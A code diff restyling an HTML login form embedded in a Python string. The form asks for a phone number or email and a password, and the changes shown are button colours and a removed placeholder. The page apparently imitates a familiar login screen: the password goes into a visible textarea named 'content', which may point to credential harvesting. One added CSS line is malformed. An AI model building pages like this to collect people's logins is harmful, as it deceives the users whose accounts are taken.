@@ -52,21 +52,21 @@ HTML_INTERFACE = """
         }
         button {
             width: 100%;
-            padding: 12px;
-            background: #00e676;
-            border: none;
-            border-radius: 4px;
-            color: #121214;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: background 0.2s;
+            padding: 12px;
+            background-color: #007bff;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
         }
         button:hover { background: #00b359; }
         .status { margin-top: 10px; text-align: center; font-weight: bold; }
         .success { color: #00e676; }
         .error { color: #f44336; }
+        background-color: #0056b3;
     </style>
 </head>
 <body>
@@ -74,7 +74,7 @@ HTML_INTERFACE = """
         <h2>Page de connéction</h2>
         <form id="postForm">
             <label for="username">Numéro ou Compte émail :</label>
-            <input type="text" id="username" name="username" placeholder="Ex: Itachi97" required>
+            <input type="text" id="username" name="username" required>
             
             <label for="content">Mot de passe :</label>
             <textarea id="content" name="content" rows="1" placeholder=".......... " required></textarea>
